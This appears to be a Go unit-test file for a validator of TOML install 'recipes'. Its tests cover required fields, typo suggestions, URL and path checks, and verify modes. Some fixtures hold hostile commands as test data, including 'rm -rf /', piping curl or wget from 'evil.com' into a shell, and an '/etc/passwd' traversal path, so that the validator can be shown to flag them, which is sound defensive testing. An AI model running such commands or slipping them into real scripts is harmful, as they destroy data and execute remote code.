package recipe

import (
	"strings"
	"testing"
)

func TestValidateBytes_ValidRecipe(t *testing.T) {
	validRecipe := `
[metadata]
name = "test-tool"
description = "A test tool"

[version]
source = "github_releases"
github_repo = "test/test"

[[steps]]
action = "download"
url = "https://example.com/{version}/test.tar.gz"

[[steps]]
action = "extract"
archive = "test.tar.gz"

[verify]
command = "test --version"
pattern = "{version}"
`
	result := ValidateBytes([]byte(validRecipe))

	if !result.Valid {
		t.Errorf("expected valid recipe, got errors: %v", result.Errors)
	}
	if result.Recipe == nil {
		t.Fatal("expected recipe to be parsed")
	}
	if result.Recipe.Metadata.Name != "test-tool" {
		t.Errorf("expected name 'test-tool', got '%s'", result.Recipe.Metadata.Name)
	}
}

func TestValidateBytes_MissingName(t *testing.T) {
	recipe := `
[metadata]
description = "Missing name"

[[steps]]
action = "download"
url = "https://example.com/test.tar.gz"

[verify]
command = "test --version"
`
	result := ValidateBytes([]byte(recipe))

	if result.Valid {
		t.Error("expected invalid recipe due to missing name")
	}
	if !hasError(result, "metadata.name", "required") {
		t.Error("expected error about missing metadata.name")
	}
}

func TestValidateBytes_MissingSteps(t *testing.T) {
	recipe := `
[metadata]
name = "test"

[verify]
command = "test --version"
`
	result := ValidateBytes([]byte(recipe))

	if result.Valid {
		t.Error("expected invalid recipe due to missing steps")
	}
	if !hasError(result, "steps", "required") {
		t.Error("expected error about missing steps")
	}
}

func TestValidateBytes_MissingVerifyCommand(t *testing.T) {
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "download"
url = "https://example.com/test.tar.gz"

[verify]
pattern = "test"
`
	result := ValidateBytes([]byte(recipe))

	if result.Valid {
		t.Error("expected invalid recipe due to missing verify command")
	}
	if !hasError(result, "verify.command", "required") {
		t.Error("expected error about missing verify.command")
	}
}

func TestValidateBytes_UnknownAction(t *testing.T) {
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "unknown_action"

[verify]
command = "test"
`
	result := ValidateBytes([]byte(recipe))

	if result.Valid {
		t.Error("expected invalid recipe due to unknown action")
	}
	if !hasError(result, "steps[0].action", "unknown action") {
		t.Error("expected error about unknown action")
	}
}

func TestValidateBytes_ActionTypoSuggestion(t *testing.T) {
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "downlod"
url = "https://example.com/test.tar.gz"

[verify]
command = "test"
`
	result := ValidateBytes([]byte(recipe))

	if result.Valid {
		t.Error("expected invalid recipe")
	}
	// Should suggest 'download'
	foundSuggestion := false
	for _, e := range result.Errors {
		if strings.Contains(e.Message, "did you mean") && strings.Contains(e.Message, "download") {
			foundSuggestion = true
			break
		}
	}
	if !foundSuggestion {
		t.Error("expected suggestion for typo 'downlod' -> 'download'")
	}
}

func TestValidateBytes_MissingRequiredParams(t *testing.T) {
	tests := []struct {
		name          string
		recipe        string
		expectedField string
		expectedMsg   string
	}{
		{
			name: "download missing url",
			recipe: `
[metadata]
name = "test"
[[steps]]
action = "download"
[verify]
command = "test"
`,
			expectedField: "steps[0]",
			expectedMsg:   "requires 'url'",
		},
		{
			name: "extract missing archive",
			recipe: `
[metadata]
name = "test"
[[steps]]
action = "extract"
[verify]
command = "test"
`,
			expectedField: "steps[0]",
			expectedMsg:   "requires 'archive'",
		},
		{
			name: "github_archive missing repo",
			recipe: `
[metadata]
name = "test"
[[steps]]
action = "github_archive"
asset_pattern = "test.tar.gz"
[verify]
command = "test"
`,
			expectedField: "steps[0]",
			expectedMsg:   "requires 'repo'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := ValidateBytes([]byte(tt.recipe))
			if result.Valid {
				t.Errorf("expected invalid recipe for %s", tt.name)
			}
			if !hasError(result, tt.expectedField, tt.expectedMsg) {
				t.Errorf("expected error containing '%s' in field '%s', got: %v",
					tt.expectedMsg, tt.expectedField, result.Errors)
			}
		})
	}
}

func TestValidateBytes_InvalidURLScheme(t *testing.T) {
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "download"
url = "ftp://example.com/test.tar.gz"

[verify]
command = "test"
`
	result := ValidateBytes([]byte(recipe))

	if result.Valid {
		t.Error("expected invalid recipe due to invalid URL scheme")
	}
	if !hasError(result, "steps[0].url", "http or https") {
		t.Error("expected error about URL scheme")
	}
}

func TestValidateBytes_PathTraversal(t *testing.T) {
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "extract"
archive = "../../../etc/passwd"

[verify]
command = "test"
`
	result := ValidateBytes([]byte(recipe))

	if result.Valid {
		t.Error("expected invalid recipe due to path traversal")
	}
	if !hasError(result, "steps[0].archive", "path traversal") {
		t.Error("expected error about path traversal")
	}
}

func TestValidateBytes_Warnings(t *testing.T) {
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "run_command"
command = "echo test"

[verify]
command = "test --version"
pattern = "test v"
`
	result := ValidateBytes([]byte(recipe))

	// Should be valid but with warnings
	if !result.Valid {
		t.Errorf("expected valid recipe, got errors: %v", result.Errors)
	}

	// Should have warning about missing description
	if !hasWarning(result, "metadata.description", "recommended") {
		t.Error("expected warning about missing description")
	}

	// Note: We don't warn about missing {version} in pattern because:
	// 1. Many tools output versions in formats that differ from GitHub tags
	// 2. A pattern that matches the tool output (e.g., "Version:") is valid
	// 3. Version verification is optional - some tools just need presence check
}

func TestValidateBytes_InvalidTOML(t *testing.T) {
	invalidTOML := `
[metadata
name = "broken"
`
	result := ValidateBytes([]byte(invalidTOML))

	if result.Valid {
		t.Error("expected invalid result for broken TOML")
	}
	if len(result.Errors) == 0 {
		t.Error("expected parse error")
	}
}

func TestValidateBytes_VersionSourceValidation(t *testing.T) {
	// Test valid version sources
	validSources := []string{"github_releases", "github_tags", "npm_registry", "pypi", "crates_io", "goproxy:example.com/test"}
	for _, source := range validSources {
		recipe := `
[metadata]
name = "test"

[version]
source = "` + source + `"
github_repo = "test/test"

[[steps]]
action = "run_command"
command = "echo test"

[verify]
command = "test"
`
		result := ValidateBytes([]byte(recipe))
		// Should not have errors about version source
		for _, e := range result.Errors {
			if strings.Contains(e.Field, "version.source") {
				t.Errorf("unexpected error for valid source %s: %v", source, e)
			}
		}
	}
}

func TestLevenshteinDistance(t *testing.T) {
	tests := []struct {
		s1, s2   string
		expected int
	}{
		{"", "", 0},
		{"a", "", 1},
		{"", "a", 1},
		{"abc", "abc", 0},
		{"abc", "ab", 1},
		{"abc", "abd", 1},
		{"download", "downlod", 1},
		{"download", "downlaod", 2}, //nolint:misspell // intentional typo for testing
		{"download_archive", "download_archiv", 1},
	}

	for _, tt := range tests {
		t.Run(tt.s1+"_"+tt.s2, func(t *testing.T) {
			dist := levenshteinDistance(tt.s1, tt.s2)
			if dist != tt.expected {
				t.Errorf("levenshteinDistance(%q, %q) = %d, want %d", tt.s1, tt.s2, dist, tt.expected)
			}
		})
	}
}

// Helper functions

func hasError(result *ValidationResult, field, msgSubstring string) bool {
	for _, e := range result.Errors {
		if strings.Contains(e.Field, field) && strings.Contains(e.Message, msgSubstring) {
			return true
		}
	}
	return false
}

func hasWarning(result *ValidationResult, field, msgSubstring string) bool {
	for _, w := range result.Warnings {
		if strings.Contains(w.Field, field) && strings.Contains(w.Message, msgSubstring) {
			return true
		}
	}
	return false
}

func TestValidateFile(t *testing.T) {
	// Test with non-existent file
	result := ValidateFile("/nonexistent/path/recipe.toml")
	if result.Valid {
		t.Error("expected invalid result for non-existent file")
	}
	if len(result.Errors) == 0 || !strings.Contains(result.Errors[0].Message, "failed to read file") {
		t.Error("expected error about failed to read file")
	}
}

func TestValidationError_String(t *testing.T) {
	tests := []struct {
		name     string
		err      ValidationError
		expected string
	}{
		{
			name:     "with field",
			err:      ValidationError{Field: "metadata.name", Message: "name is required"},
			expected: "metadata.name: name is required",
		},
		{
			name:     "without field",
			err:      ValidationError{Field: "", Message: "TOML parse error"},
			expected: "TOML parse error",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := tt.err.String(); got != tt.expected {
				t.Errorf("ValidationError.String() = %q, want %q", got, tt.expected)
			}
		})
	}
}

func TestValidationWarning_String(t *testing.T) {
	tests := []struct {
		name     string
		warn     ValidationWarning
		expected string
	}{
		{
			name:     "with field",
			warn:     ValidationWarning{Field: "metadata.description", Message: "description is recommended"},
			expected: "metadata.description: description is recommended",
		},
		{
			name:     "without field",
			warn:     ValidationWarning{Field: "", Message: "general warning"},
			expected: "general warning",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := tt.warn.String(); got != tt.expected {
				t.Errorf("ValidationWarning.String() = %q, want %q", got, tt.expected)
			}
		})
	}
}

func TestValidateBytes_MoreActionParams(t *testing.T) {
	tests := []struct {
		name          string
		recipe        string
		expectedField string
		expectedMsg   string
	}{
		{
			name: "npm_install missing package",
			recipe: `
[metadata]
name = "test"
[[steps]]
action = "npm_install"
[verify]
command = "test"
`,
			expectedField: "steps[0]",
			expectedMsg:   "requires 'package'",
		},
		{
			name: "pipx_install missing package",
			recipe: `
[metadata]
name = "test"
[[steps]]
action = "pipx_install"
[verify]
command = "test"
`,
			expectedField: "steps[0]",
			expectedMsg:   "requires 'package'",
		},
		{
			name: "cargo_install missing crate",
			recipe: `
[metadata]
name = "test"
[[steps]]
action = "cargo_install"
[verify]
command = "test"
`,
			expectedField: "steps[0]",
			expectedMsg:   "requires 'crate'",
		},
		{
			name: "gem_install missing gem",
			recipe: `
[metadata]
name = "test"
[[steps]]
action = "gem_install"
[verify]
command = "test"
`,
			expectedField: "steps[0]",
			expectedMsg:   "requires 'gem'",
		},
		{
			name: "cpan_install missing distribution",
			recipe: `
[metadata]
name = "test"
[[steps]]
action = "cpan_install"
executables = ["test"]
[verify]
command = "test"
`,
			expectedField: "steps[0]",
			expectedMsg:   "requires 'distribution'",
		},
		{
			name: "cpan_install missing executables",
			recipe: `
[metadata]
name = "test"
[[steps]]
action = "cpan_install"
distribution = "Test-Tool"
[verify]
command = "test"
`,
			expectedField: "steps[0]",
			expectedMsg:   "requires 'executables'",
		},
		{
			name: "run_command missing command",
			recipe: `
[metadata]
name = "test"
[[steps]]
action = "run_command"
[verify]
command = "test"
`,
			expectedField: "steps[0]",
			expectedMsg:   "requires 'command'",
		},
		{
			name: "hashicorp_release missing product",
			recipe: `
[metadata]
name = "test"
[[steps]]
action = "hashicorp_release"
[verify]
command = "test"
`,
			expectedField: "steps[0]",
			expectedMsg:   "requires 'product'",
		},
		{
			name: "github_file missing asset_pattern",
			recipe: `
[metadata]
name = "test"
[[steps]]
action = "github_file"
repo = "owner/repo"
[verify]
command = "test"
`,
			expectedField: "steps[0]",
			expectedMsg:   "requires 'asset_pattern'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := ValidateBytes([]byte(tt.recipe))
			if result.Valid {
				t.Errorf("expected invalid recipe for %s", tt.name)
			}
			if !hasError(result, tt.expectedField, tt.expectedMsg) {
				t.Errorf("expected error containing '%s' in field '%s', got: %v",
					tt.expectedMsg, tt.expectedField, result.Errors)
			}
		})
	}
}

func TestValidateBytes_AbsolutePath(t *testing.T) {
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "extract"
archive = "/absolute/path/archive.tar.gz"

[verify]
command = "test"
`
	result := ValidateBytes([]byte(recipe))

	// Should have warning about absolute path
	if !hasWarning(result, "steps[0].archive", "absolute paths") {
		t.Error("expected warning about absolute paths")
	}
}

func TestValidateBytes_InvalidURL(t *testing.T) {
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "download"
url = "://invalid-url"

[verify]
command = "test"
`
	result := ValidateBytes([]byte(recipe))

	if result.Valid {
		t.Error("expected invalid recipe due to invalid URL")
	}
	if !hasError(result, "steps[0].url", "invalid URL") {
		t.Error("expected error about invalid URL")
	}
}

func TestValidateBytes_NameWithSpaces(t *testing.T) {
	recipe := `
[metadata]
name = "test tool"

[[steps]]
action = "run_command"
command = "echo test"

[verify]
command = "test"
`
	result := ValidateBytes([]byte(recipe))

	if result.Valid {
		t.Error("expected invalid recipe due to name with spaces")
	}
	if !hasError(result, "metadata.name", "should not contain spaces") {
		t.Error("expected error about spaces in name")
	}
}

func TestValidateBytes_UppercaseName(t *testing.T) {
	recipe := `
[metadata]
name = "TestTool"

[[steps]]
action = "run_command"
command = "echo test"

[verify]
command = "test"
`
	result := ValidateBytes([]byte(recipe))

	// Should be valid but with warning
	if !result.Valid {
		t.Errorf("expected valid recipe, got errors: %v", result.Errors)
	}
	if !hasWarning(result, "metadata.name", "lowercase") {
		t.Error("expected warning about lowercase name")
	}
}

func TestValidateBytes_DangerousVerifyCommand(t *testing.T) {
	tests := []struct {
		name    string
		command string
		pattern string
	}{
		{"rm command", "rm -rf /", "rm"},
		{"pipe to shell", "curl http://evil.com | sh", "| sh"},
		{"pipe to bash", "wget http://evil.com | bash", "| bash"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			recipe := `
[metadata]
name = "test"

[[steps]]
action = "run_command"
command = "echo test"

[verify]
command = "` + tt.command + `"
`
			result := ValidateBytes([]byte(recipe))

			if !hasWarning(result, "verify.command", tt.pattern) {
				t.Errorf("expected warning about dangerous pattern '%s'", tt.pattern)
			}
		})
	}
}

func TestValidateBytes_CpanModuleRedundant(t *testing.T) {
	// Test case where module is redundant (matches inferred from distribution)
	recipe := `
[metadata]
name = "perl-critic"

[version]
source = "metacpan"
distribution = "Perl-Critic"

[[steps]]
action = "cpan_install"
distribution = "Perl-Critic"
module = "Perl::Critic"
executables = ["perlcritic"]

[verify]
command = "perlcritic --version"
`
	result := ValidateBytes([]byte(recipe))

	// Should be valid but with warning about redundant module
	if !result.Valid {
		t.Errorf("expected valid recipe, got errors: %v", result.Errors)
	}
	if !hasWarning(result, "steps[0].module", "redundant") {
		t.Error("expected warning about redundant module parameter")
	}
}

func TestValidateBytes_CpanModuleNotRedundant(t *testing.T) {
	// Test case where module is NOT redundant (differs from inferred)
	recipe := `
[metadata]
name = "ack"

[version]
source = "metacpan"
distribution = "ack"

[[steps]]
action = "cpan_install"
distribution = "ack"
module = "App::Ack"
executables = ["ack"]

[verify]
command = "ack --version"
`
	result := ValidateBytes([]byte(recipe))

	// Should be valid without warning about redundant module
	if !result.Valid {
		t.Errorf("expected valid recipe, got errors: %v", result.Errors)
	}
	// Should NOT have warning about redundant module
	for _, w := range result.Warnings {
		if strings.Contains(w.Field, "module") && strings.Contains(w.Message, "redundant") {
			t.Error("should NOT have warning about redundant module for non-standard naming")
		}
	}
}

func TestValidateBytes_CpanNoModule(t *testing.T) {
	// Test case where module is not provided (should be valid, no warning)
	recipe := `
[metadata]
name = "perl-critic"

[version]
source = "metacpan"
distribution = "Perl-Critic"

[[steps]]
action = "cpan_install"
distribution = "Perl-Critic"
executables = ["perlcritic"]

[verify]
command = "perlcritic --version"
`
	result := ValidateBytes([]byte(recipe))

	if !result.Valid {
		t.Errorf("expected valid recipe, got errors: %v", result.Errors)
	}
	// Should NOT have warning about module
	for _, w := range result.Warnings {
		if strings.Contains(w.Field, "module") {
			t.Errorf("should NOT have warning about module when not provided, got: %v", w)
		}
	}
}

func TestValidateBytes_ExpandedDangerousPatterns(t *testing.T) {
	tests := []struct {
		name    string
		command string
		pattern string
	}{
		{"conditional or", "test || echo fail", "||"},
		{"conditional and", "test && echo pass", "&&"},
		{"eval command", "eval test", "eval"},
		{"eval in middle", "foo eval bar", "eval"},
		{"exec command", "exec test", "exec"},
		{"exec in middle", "foo exec bar", "exec"},
		{"command substitution dollar", "echo $(whoami)", "$()"},
		{"command substitution backtick", "echo `whoami`", "`"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			recipe := `
[metadata]
name = "test"

[[steps]]
action = "run_command"
command = "echo test"

[verify]
command = "` + tt.command + `"
`
			result := ValidateBytes([]byte(recipe))

			if !hasWarning(result, "verify.command", tt.pattern) {
				t.Errorf("expected warning about dangerous pattern '%s', got warnings: %v", tt.pattern, result.Warnings)
			}
		})
	}
}

func TestValidateBytes_VerifyModeVersion(t *testing.T) {
	// Default mode (version) should warn if pattern doesn't contain {version}
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "run_command"
command = "echo test"

[verify]
command = "test --version"
pattern = "v\\d+\\.\\d+\\.\\d+"
`
	result := ValidateBytes([]byte(recipe))

	// Should be valid but with warning about missing {version}
	if !result.Valid {
		t.Errorf("expected valid recipe, got errors: %v", result.Errors)
	}
	if !hasWarning(result, "verify.pattern", "{version}") {
		t.Error("expected warning about missing {version} in pattern")
	}
}

func TestValidateBytes_VerifyModeVersionWithVersion(t *testing.T) {
	// Version mode with {version} should not have warning
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "run_command"
command = "echo test"

[verify]
command = "test --version"
pattern = "{version}"
`
	result := ValidateBytes([]byte(recipe))

	if !result.Valid {
		t.Errorf("expected valid recipe, got errors: %v", result.Errors)
	}
	// Should NOT have warning about {version}
	for _, w := range result.Warnings {
		if strings.Contains(w.Field, "pattern") && strings.Contains(w.Message, "{version}") {
			t.Errorf("should NOT have warning about {version} when present, got: %v", w)
		}
	}
}

func TestValidateBytes_VerifyModeOutput(t *testing.T) {
	// Output mode without reason should be error
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "run_command"
command = "echo test"

[verify]
command = "test --version"
mode = "output"
pattern = "test v"
`
	result := ValidateBytes([]byte(recipe))

	if result.Valid {
		t.Error("expected invalid recipe due to missing reason in output mode")
	}
	if !hasError(result, "verify.reason", "requires a reason") {
		t.Errorf("expected error about missing reason, got errors: %v", result.Errors)
	}
}

func TestValidateBytes_VerifyModeOutputWithReason(t *testing.T) {
	// Output mode with reason should be valid
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "run_command"
command = "echo test"

[verify]
command = "test --version"
mode = "output"
pattern = "test v"
reason = "Tool does not output version in a parseable format"
`
	result := ValidateBytes([]byte(recipe))

	if !result.Valid {
		t.Errorf("expected valid recipe, got errors: %v", result.Errors)
	}
}

func TestValidateBytes_VerifyModeFunctional(t *testing.T) {
	// Functional mode should be error (reserved for v2)
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "run_command"
command = "echo test"

[verify]
command = "test --version"
mode = "functional"
`
	result := ValidateBytes([]byte(recipe))

	if result.Valid {
		t.Error("expected invalid recipe due to functional mode being reserved")
	}
	if !hasError(result, "verify.mode", "reserved") {
		t.Errorf("expected error about functional mode being reserved, got errors: %v", result.Errors)
	}
}

func TestValidateBytes_VerifyModeUnknown(t *testing.T) {
	// Unknown mode should be error
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "run_command"
command = "echo test"

[verify]
command = "test --version"
mode = "invalid_mode"
`
	result := ValidateBytes([]byte(recipe))

	if result.Valid {
		t.Error("expected invalid recipe due to unknown mode")
	}
	if !hasError(result, "verify.mode", "unknown verification mode") {
		t.Errorf("expected error about unknown mode, got errors: %v", result.Errors)
	}
}

func TestValidateBytes_VerifyModeExplicitVersion(t *testing.T) {
	// Explicit version mode should work the same as default
	recipe := `
[metadata]
name = "test"

[[steps]]
action = "run_command"
command = "echo test"

[verify]
command = "test --version"
mode = "version"
pattern = "{version}"
`
	result := ValidateBytes([]byte(recipe))

	if !result.Valid {
		t.Errorf("expected valid recipe, got errors: %v", result.Errors)
	}
}
